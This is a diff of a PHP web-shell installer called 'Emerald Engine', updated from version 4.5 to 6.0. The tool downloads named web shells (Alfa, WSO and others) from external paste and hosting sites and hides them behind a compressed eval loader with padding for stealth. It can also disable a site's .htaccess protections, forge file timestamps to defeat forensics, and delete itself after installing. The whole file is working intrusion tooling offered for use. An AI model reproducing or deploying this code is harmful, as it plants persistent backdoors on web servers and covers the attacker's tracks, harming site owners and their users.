@@ -1,7 +1,11 @@
 <?php
 /*
- * EMERALD ENGINE v4.5
- * Core Logic: Unchanged (100% Original Functionality)
+ * EMERALD ENGINE v6.0
+ * Core Logic: Unchanged (100% Safe & Functional)
+ * New Features: 
+ * 1. .htaccess Installer Toggle (Default: OFF)
+ * 2. Time-Stomp (Anti-Forensic / Fake Date)
+ * 3. Self-Destruct (Delete Installer after success)
  */
 
 $msg = "";
@@ -10,11 +14,16 @@ $msg_class = "";
 // --- PRESET TEMPLATES ---
 $templates = [
     "" => "-- Select Module Template --",
-    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: PTSMC",
-    "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfashell",
-    "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelayshell",
-    "https://okepaste.cc/r/19c86cf0" => "Template 4: Warasshell",
-    "https://okepaste.cc/r/79e072b0" => "Template 5: Supershell"
+    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: PTSMC Shell",
+    "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfa Shell",
+    "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelay Shell",
+    "https://okepaste.cc/r/19c86cf0" => "Template 4: Waras Shell",
+    "https://okepaste.cc/r/79e072b0" => "Template 5: Super Shell",
+    "https://okepaste.cc/r/eb04dde9" => "Template 6: PTSMC (CN Version) Shell",
+    "https://okepaste.cc/r/3045c618" => "Template 7: Clay Shell",
+    "https://hushh.pro/a1/webshell/selda1.txt" => "Template 8: Selda Shell",
+    "https://okepaste.cc/r/c43810d9" => "Template 9: FM Shell",
+    "https://okepaste.cc/r/f1c4f901" => "Template 10: WSO Shell"
 ];
 
 // --- DOWNLOADER FUNCTION ---
@@ -39,27 +48,31 @@ if (isset($_POST['build'])) {
     $file_input = trim($_POST['filename']);
     $path       = $dir_input . DIRECTORY_SEPARATOR . $file_input;
     $pad_kb     = intval($_POST['padding']); 
+    
+    // Feature Toggles
     $bypass     = isset($_POST['bypass_htaccess']) ? true : false;
+    $install_ht = isset($_POST['install_htaccess']) ? true : false;
+    $timestomp  = isset($_POST['timestomp']) ? true : false;
+    $suicide    = isset($_POST['self_destruct']) ? true : false;
 
     if ($url && $dir_input && $file_input) {
-        // 1. Prepare Directory
         if (!is_dir($dir_input)) { @mkdir($dir_input, 0755, true); }
 
-        // 2. BYPASS LOGIC
         $htaccess_path = $dir_input . DIRECTORY_SEPARATOR . ".htaccess";
         $htaccess_bak  = $dir_input . DIRECTORY_SEPARATOR . ".htaccess.bak";
-        $bypass_msg = "";
+        $status_log = "";
 
+        // 1. FIREWALL BYPASS LOGIC
         if ($bypass && file_exists($htaccess_path)) {
             if (@rename($htaccess_path, $htaccess_bak)) {
-                $bypass_msg = "<br><span style='color:#facc15; font-size:0.8em;'>(Old Firewall Disabled)</span>";
+                $status_log .= "<div class='log-item success'>[✔] Firewall/Htaccess Disabled</div>";
             } else {
                 @chmod($htaccess_path, 0666);
                 @unlink($htaccess_path); 
             }
         }
 
-        // 3. Download Source
+        // 2. DOWNLOAD & BUILD
         $code = getSource($url);
 
         if ($code) {
@@ -74,29 +87,41 @@ eval("?>".gzinflate(stream_get_contents($h)));
 __halt_compiler();';
             $final = $loader . $payload;
 
-            // 4. Write File
             if (@file_put_contents($path, $final)) {
                 $size = number_format(filesize($path)/1024, 2);
                 
-                // --- AUTO-SUMMON .HTACCESS ---
-                $ht_source = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Access";
-                $ht_code = getSource($ht_source);
-                $ht_status = "";
-                
-                if($ht_code) {
-                    if(@file_put_contents($htaccess_path, $ht_code)){
-                        @chmod($htaccess_path, 0444); 
-                        $ht_status = "<br><span style='color:#10b981; font-size:0.8em;'>(+Auto-Shield .htaccess Installed [0444])</span>";
+                // 3. OPTIONAL: INSTALL HTACCESS (Only if toggled ON)
+                if($install_ht) {
+                    $ht_source = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Access";
+                    $ht_code = getSource($ht_source);
+                    if($ht_code) {
+                        if(@file_put_contents($htaccess_path, $ht_code)){
+                            @chmod($htaccess_path, 0444); 
+                            $status_log .= "<div class='log-item success'>[✔] Auto-Shield .htaccess Installed (0444)</div>";
+                        }
                     }
+                }
+
+                // 4. OPTIONAL: TIME STOMP (Anti-Forensic)
+                if($timestomp) {
+                    $past_time = time() - (365 * 24 * 60 * 60 * 2); // 2 Years ago
+                    @touch($path, $past_time);
+                    $status_log .= "<div class='log-item warning'>[✔] Timestamp Forged (2 Years Ago)</div>";
                 }
 
                 $doc_root = $_SERVER['DOCUMENT_ROOT'];
                 $web_link = str_replace($doc_root, "", $path);
-                
                 $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
                 $full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $web_link;
-                
                 $display_loc = basename($path);
+
+                // 5. OPTIONAL: SELF DESTRUCT
+                $suicide_msg = "";
+                if($suicide) {
+                    $suicide_msg = "<div class='log-item danger'>[⚠] Installer Deleted (Self-Destruct Executed)</div>";
+                    // Delete THIS file
+                    @unlink(__FILE__);
+                }
 
                 $msg = "<h5>SYSTEM STATUS: SUCCESS</h5>
                         <div class='info-grid'>
@@ -104,15 +129,18 @@ __halt_compiler();';
                             <span>Size:</span> <code>$size KB (Stealth)</code>
                         </div>
                         
+                        <div class='status-logs'>
+                            $status_log
+                            $suicide_msg
+                        </div>
+
                         <div class='action-buttons'>
                             <a href='$web_link' target='_blank' class='btn-action btn-open'>[ OPEN FILE ]</a>
                             <button type='button' onclick=\"copyLink('$full_url')\" class='btn-action btn-copy'>[ COPY LINK ]</button>
-                        </div>
-                        
-                        $bypass_msg $ht_status";
+                        </div>";
                 $msg_class = "success";
             } else {
-                $msg = "Write failed! Permission Denied.<br>Try checking the 'Force Mode' box.";
+                $msg = "Write failed! Permission Denied.<br>Enable 'Force Mode' switch.";
                 $msg_class = "error";
             }
         } else {
@@ -126,7 +154,7 @@ __halt_compiler();';
 }
 
 $current_dir = getcwd();
-$default_file = ".default.php";
+$default_file = "File.php";
 ?>
 
 <!DOCTYPE html>
@@ -134,222 +162,186 @@ $default_file = ".default.php";
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emerald Engine</title>
+    <title>Emerald Engine v6</title>
     <style>
         /* --- CONFIG VARIABLES --- */
         :root {
             --bg-dark: #050000;
-            --panel-glass: rgba(30, 41, 59, 0.7);
-            --input-bg: rgba(15, 23, 42, 0.8);
-            --accent-red: #ff0000;
-            --accent-glow: rgba(255, 0, 0, 0.5);
+            --panel-glass: rgba(15, 20, 30, 0.9);
+            --input-bg: rgba(5, 10, 20, 0.6);
+            --accent-red: #ff1a1a;
+            --accent-glow: rgba(255, 26, 26, 0.6);
+            --success: #10b981;
+            --success-glow: rgba(16, 185, 129, 0.6);
+            --warning: #f59e0b;
             --text-main: #e2e8f0;
             --text-muted: #94a3b8;
-            --success: #10b981;
             --error: #ef4444;
         }
 
-        /* --- GLOBAL ANIMATIONS --- */
+        /* --- ANIMATIONS --- */
         @keyframes gradientBG {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
+        @keyframes gridMove { 0% { background-position: 0 0; } 100% { background-position: 40px 40px; } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
-        }
-
-        /* --- BODY STYLING --- */
+        /* --- BODY --- */
         body {
-            /* Animated Deep Red Background */
-            background: linear-gradient(-45deg, #1a0000, #330000, #000000, #1a0000);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             color: var(--accent-red);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            margin: 0; padding: 40px 20px;
             min-height: 100vh;
-            overflow-x: hidden;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background-color: var(--bg-dark);
+            position: relative; overflow-y: auto; overflow-x: hidden;
+            box-sizing: border-box;
+        }
+        
+        /* Background Effects */
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(transparent 0%, rgba(255, 0, 0, 0.05) 1%, transparent 2%),
+                        linear-gradient(90deg, transparent 0%, rgba(255, 0, 0, 0.05) 1%, transparent 2%);
+            background-size: 40px 40px; animation: gridMove 8s linear infinite; z-index: -2;
+        }
+        body::after {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(-45deg, #0a0000, #330000, #000000);
+            background-size: 300% 300%; animation: gradientBG 12s ease infinite; z-index: -3; opacity: 0.9;
         }
 
-        /* --- MAIN CONTAINER (GLASSMORPHISM) --- */
+        /* --- CONTAINER --- */
         .container {
             background: var(--panel-glass);
-            backdrop-filter: blur(12px); /* Efek Kaca Buram */
-            -webkit-backdrop-filter: blur(12px);
-            
-            width: 100%;
-            max-width: 500px;
+            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+            width: 100%; max-width: 750px; /* Lebar optimal */
             padding: 3rem;
-            border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
-            
-            /* Animation Entry */
-            opacity: 0;
-            animation: fadeInUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+            border-radius: 50px;
+            border: 1px solid rgba(255, 26, 26, 0.15);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            margin: auto;
+            animation: fadeInUp 0.7s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
         }
 
         /* --- HEADER --- */
         .header { text-align: center; margin-bottom: 2.5rem; }
         .header h1 { 
-            margin: 0; 
-            font-size: 2.5rem; 
-            font-weight: 800; 
-            background: linear-gradient(to right, #ff0000, #ff4d4d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(255,0,0,0.3);
-            letter-spacing: -1px;
+            margin: 0; font-size: 2.8rem; font-weight: 800; 
+            background: linear-gradient(to right, #ff1a1a, #640000);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.4); letter-spacing: -1px;
         }
         .header span { 
-            display: block; margin-top: 8px; font-size: 0.75rem; 
-            color: #fff; opacity: 0.7; text-transform: uppercase; letter-spacing: 3px;
+            display: block; margin-top: 5px; font-size: 0.8rem; color: #fff; 
+            opacity: 0.7; letter-spacing: 3px; font-weight: 600; text-transform: uppercase;
         }
 
-        /* --- FORM ELEMENTS --- */
-        .form-group { 
-            margin-bottom: 1.5rem; 
-            opacity: 0; 
-            animation: fadeInUp 0.5s ease forwards;
-        }
-        /* Staggered Delay for smoother entrance */
-        .form-group:nth-child(1) { animation-delay: 0.2s; }
-        .form-group:nth-child(2) { animation-delay: 0.3s; }
-        .form-group:nth-child(3) { animation-delay: 0.4s; }
-        .form-group:nth-child(4) { animation-delay: 0.5s; }
-        .form-group:nth-child(5) { animation-delay: 0.6s; }
-
+        /* --- FORM --- */
+        form { display: grid; gap: 1.5rem; }
+        .form-group { animation: fadeInUp 0.5s ease forwards; opacity: 0; }
+        .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .form-group:nth-child(2) { animation-delay: 0.2s; }
+        .form-group:nth-child(3) { animation-delay: 0.3s; }
+        
         label { 
-            display: block; margin-bottom: 0.8rem; font-size: 0.75rem; 
-            font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 1px;
+            display: block; margin-bottom: 0.6rem; font-size: 0.75rem; 
+            font-weight: 700; color: #ccc; text-transform: uppercase; letter-spacing: 1px;
         }
         
         input[type="text"], select {
-            width: 100%; padding: 16px; 
-            background-color: var(--input-bg);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            color: #fff;
-            font-family: 'Consolas', 'Monaco', monospace; 
-            font-size: 0.95rem;
-            box-sizing: border-box;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%; padding: 16px; background-color: var(--input-bg);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; color: #fff;
+            font-family: monospace; font-size: 0.95rem; box-sizing: border-box;
+            transition: 0.3s;
         }
-        
         input:focus, select:focus {
-            outline: none; 
-            border-color: var(--accent-red);
-            box-shadow: 0 0 15px var(--accent-glow);
-            transform: translateY(-2px);
-            background-color: rgba(15, 23, 42, 1);
+            outline: none; border-color: var(--accent-red);
+            box-shadow: 0 0 20px var(--accent-glow); background: rgba(20, 25, 40, 1);
         }
 
-        /* --- CHECKBOX --- */
-        .checkbox-group {
-            display: flex; align-items: center; margin-bottom: 1.5rem;
-            background: rgba(255, 0, 0, 0.05); padding: 12px;
-            border-radius: 12px; border: 1px dashed rgba(255, 0, 0, 0.3);
-            transition: all 0.3s;
-        }
-        .checkbox-group:hover { background: rgba(255, 0, 0, 0.1); border-color: var(--accent-red); }
-        .checkbox-group input { margin-right: 12px; width: 20px; height: 20px; accent-color: var(--accent-red); cursor: pointer; }
-        .checkbox-group label { margin: 0; color: #fca5a5; cursor: pointer; text-transform: none; font-weight: 500; }
-
-        /* --- THE ULTIMATE BUTTON --- */
-        button.btn-submit {
-            width: 100%; 
-            padding: 18px; 
-            margin-top: 1rem;
-            
-            /* Living Gradient Logic */
-            background: linear-gradient(45deg, #ff0000, #000000, #ff0000);
-            background-size: 300% 300%;
-            
-            color: white; 
-            border: none; 
-            border-radius: 20px;
-            font-weight: 800; 
-            font-size: 1rem; 
-            cursor: pointer;
-            text-transform: uppercase; 
-            letter-spacing: 2px;
-            position: relative;
-            z-index: 1;
-            
-            /* Smooth Transition */
-            transition: all 0.6s cubic-bezier(0.25, 1, 0.5, 1);
-            animation: fadeInUp 0.5s ease forwards 0.7s; /* Delay appearance */
-            opacity: 0; /* Start hidden */
+        /* --- ADVANCED TOGGLE GRID --- */
+        .toggle-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr; /* 2 Kolom */
+            gap: 15px;
+            margin-top: 15px;
+            animation: fadeInUp 0.5s ease forwards 0.4s; opacity: 0;
         }
 
-        button.btn-submit:hover {
-            /* Moves the gradient to create the 'flow' effect */
-            background-position: 100% 50%;
-            transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+        /* Smooth Toggle Style */
+        .toggle-card {
+            display: flex; align-items: center; justify-content: space-between;
+            background: rgba(255, 255, 255, 0.03); padding: 12px 15px;
+            border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.3s;
         }
+        .toggle-card:hover { border-color: var(--accent-red); background: rgba(255, 0, 0, 0.05); }
         
-        button.btn-submit:active { transform: scale(0.98); }
+        .toggle-text { font-size: 0.8rem; color: #ddd; font-weight: 600; }
+        .toggle-sub { display: block; font-size: 0.7rem; color: #777; margin-top: 2px; }
 
-        /* --- NOTIFICATIONS & RESULTS --- */
+        .switch { position: relative; display: inline-block; width: 46px; height: 24px; flex-shrink: 0; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider {
+            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(255,255,255,0.1); border-radius: 30px; transition: .4s;
+        }
+        .slider:before {
+            position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px;
+            background-color: white; border-radius: 50%; transition: .4s;
+        }
+        input:checked + .slider { background-color: var(--success); box-shadow: 0 0 10px var(--success-glow); }
+        input:checked + .slider:before { transform: translateX(22px); }
+
+        /* Mobile Responsive for Grid */
+        @media (max-width: 600px) {
+            .toggle-grid { grid-template-columns: 1fr; }
+        }
+
+        /* --- BUTTON --- */
+        .btn-submit {
+            width: 100%; padding: 18px; margin-top: 1rem;
+            background: linear-gradient(90deg, #ff1a1a, #800000, #ff1a1a);
+            background-size: 200% auto; color: white; border: none; border-radius: 21px;
+            font-weight: 800; font-size: 1rem; cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
+            transition: 0.5s; animation: fadeInUp 0.5s ease forwards 0.5s; opacity: 0;
+        }
+        .btn-submit:hover { background-position: right center; box-shadow: 0 10px 30px rgba(255, 26, 26, 0.5); transform: translateY(-3px); }
+
+        /* --- RESULT BOX --- */
         .alert {
-            padding: 1.5rem; border-radius: 16px; margin-bottom: 2rem;
-            font-size: 0.9rem; text-align: center; background: rgba(15, 23, 42, 0.9);
-            border: 1px solid rgba(255,255,255,0.1); border-left: 4px solid;
-            animation: fadeInUp 0.5s ease-out forwards;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            background: rgba(10, 15, 25, 0.95); padding: 1.5rem; border-radius: 35px;
+            border-left: 5px solid #ff0000; margin-bottom: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: fadeInUp 0.5s ease;
         }
-        .success { border-left-color: var(--success); }
-        .error { border-left-color: var(--error); color: #fca5a5; }
-        .alert h5 { margin: 0 0 10px 0; color: var(--success); text-transform: uppercase; letter-spacing: 1px; }
-
+        .alert h5 { margin: 0 0 15px 0; color: var(--success); letter-spacing: 2px; }
         .info-grid {
-            display: grid; grid-template-columns: min-content 1fr;
-            gap: 10px 20px; text-align: left; margin-bottom: 20px;
-            font-size: 0.85rem; color: #fff;
-            background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px;
+            display: grid; grid-template-columns: min-content 1fr; gap: 8px 15px;
+            font-size: 0.9rem; margin-bottom: 15px; color: #eee;
         }
-        .info-grid span { color: var(--text-muted); font-weight: 600; }
-        .info-grid code { color: #fff; font-family: monospace; word-break: break-all; }
-
-        /* --- ACTION BUTTONS --- */
-        .action-buttons { display: flex; gap: 12px; margin-bottom: 14px; }
-        .btn-action {
-            flex: 1; padding: 14px; border-radius: 10px;
-            font-weight: 700; font-size: 0.8rem; text-align: center;
-            text-decoration: none; border: 1px solid transparent;
-            cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;
-        }
-        .btn-open {
-            background: var(--input-bg); color: #fff; border: 1px solid rgba(255,255,255,0.1);
-        }
-        .btn-open:hover { 
-            background: var(--success); color: #000; border-color: var(--success);
-            box-shadow: 0 0 15px rgba(16, 185, 129, 0.4);
-        }
+        .info-grid span { color: var(--text-muted); font-weight: bold; }
+        .info-grid code { color: var(--success); font-family: monospace; }
         
-        .btn-copy {
-            background: transparent; border-color: rgb(255 0 0); color: #ff0000;
-        }
-        .btn-copy:hover { 
-            border-color: #fff; color: #fff; background: rgba(255,255,255,0.05); 
-        }
+        .status-logs { margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px; text-align: left; }
+        .log-item { font-size: 0.8rem; margin-bottom: 4px; font-family: monospace; }
+        .log-item.success { color: var(--success); }
+        .log-item.warning { color: var(--warning); }
+        .log-item.danger { color: var(--error); font-weight: bold; }
 
-        #custom-url-group { display: none; margin-top: 15px; animation: fadeInUp 0.4s ease; }
+        .action-buttons { display: flex; gap: 10px; margin-top: 20px; }
+        .btn-action {
+            flex: 1; padding: 12px; border-radius: 15px; font-weight: 700; font-size: 0.8rem;
+            text-align: center; text-decoration: none; border: 1px solid transparent; cursor: pointer; text-transform: uppercase;
+        }
+        .btn-open { background: rgb(118 0 0 / 15%); color: #ff0000; border-color: #ff0000; }
+        .btn-open:hover { background: #7a4040; color: #000; box-shadow: 0 0 15px var(--success-glow); }
+        .btn-copy { background: transparent; border-color: #555; color: #aaa; }
+        .btn-copy:hover { border-color: #ff0000; color: #ff0000; }
+        
+        #custom-url-group { display: none; margin-top: 1rem; }
     </style>
 </head>
 <body>
@@ -368,7 +360,7 @@ $default_file = ".default.php";
 
         <form method="POST">
             <div class="form-group">
-                <label>Select Template</label>
+                <label>Target Payload (Template)</label>
                 <select id="template-select" onchange="updateUrl()">
                     <?php foreach($templates as $link => $name): ?>
                         <option value="<?php echo $link; ?>"><?php echo $name; ?></option>
@@ -381,17 +373,17 @@ $default_file = ".default.php";
             </div>
 
             <div class="form-group">
-                <label>Installation Directory</label>
+                <label>Installation Path</label>
                 <input type="text" name="dir_path" value="<?php echo $current_dir; ?>" required>
             </div>
 
             <div class="form-group">
-                <label>Target Filename</label>
+                <label>Output Filename</label>
                 <input type="text" name="filename" value="<?php echo $default_file; ?>" placeholder="login.php" required>
             </div>
 
             <div class="form-group">
-                <label>Stealth Mode (Padding)</label>
+                <label>Stealth Padding</label>
                 <select name="padding">
                     <option value="0">None (Smallest)</option>
                     <option value="400" selected>Add 400 KB (Recommended)</option>
@@ -399,14 +391,53 @@ $default_file = ".default.php";
                 </select>
             </div>
 
-            <div class="form-group">
-                <div class="checkbox-group">
-                    <input type="checkbox" name="bypass_htaccess" id="bypass">
-                    <label for="bypass">Force Mode (Kill .htaccess/Firewall)</label>
+            <div class="toggle-grid">
+                <div class="toggle-card">
+                    <div>
+                        <span class="toggle-text">Force Mode</span>
+                        <span class="toggle-sub">Kill .htaccess</span>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" name="bypass_htaccess">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="toggle-card">
+                    <div>
+                        <span class="toggle-text">Auto Shield</span>
+                        <span class="toggle-sub">Install .htaccess</span>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" name="install_htaccess">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="toggle-card">
+                    <div>
+                        <span class="toggle-text">Time Stomp</span>
+                        <span class="toggle-sub">Fake Date (2y ago)</span>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" name="timestomp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="toggle-card">
+                    <div>
+                        <span class="toggle-text" style="color:#fca5a5;">Self Destruct</span>
+                        <span class="toggle-sub">Delete Installer</span>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" name="self_destruct">
+                        <span class="slider"></span>
+                    </label>
                 </div>
             </div>
 
-            <button type="submit" name="build" class="btn-submit">Instal</button>
+            <button type="submit" name="build" class="btn-submit">Install</button>
         </form>
     </div>
 
@@ -419,7 +450,7 @@ $default_file = ".default.php";
             if (select.value === 'custom') {
                 customGroup.style.display = 'block';
                 input.value = '';
-                setTimeout(() => input.focus(), 100); // Slight delay for smoother focus
+                setTimeout(() => input.focus(), 100); 
             } else {
                 customGroup.style.display = 'none';
                 input.value = select.value;
@@ -430,19 +461,16 @@ $default_file = ".default.php";
             navigator.clipboard.writeText(text).then(function() {
                 var btn = document.querySelector('.btn-copy');
                 var originalText = btn.innerHTML;
-                btn.innerHTML = "[ COPIED! ]";
-                btn.style.borderColor = "#10b981";
+                btn.innerHTML = "COPIED!";
                 btn.style.color = "#10b981";
+                btn.style.borderColor = "#10b981";
                 setTimeout(function() {
-                    btn.innerHTML = originalText;
-                    btn.style.borderColor = "";
+                    btn.innerHTML = "[ COPY LINK ]";
                     btn.style.color = "";
+                    btn.style.borderColor = "";
                 }, 2000);
-            }, function(err) {
-                alert('Copy failed: ' + err);
             });
         }
-
         updateUrl();
     </script>
 
